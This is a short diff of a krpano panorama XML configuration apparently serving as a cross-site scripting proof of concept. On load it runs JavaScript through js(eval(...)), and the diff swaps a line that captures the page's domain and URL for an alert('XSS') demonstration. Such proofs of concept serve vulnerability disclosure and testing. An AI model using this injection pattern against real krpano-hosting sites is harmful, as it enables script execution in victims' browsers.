@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.18.3" onstart="poc()">
-    <action name="poc">js(eval('window.__krpano_origin=document.domain;window.__krpano_url=location.href'))</action>
+	<action name="poc">js(eval('alert("XSS")'))</action>
 </krpano>
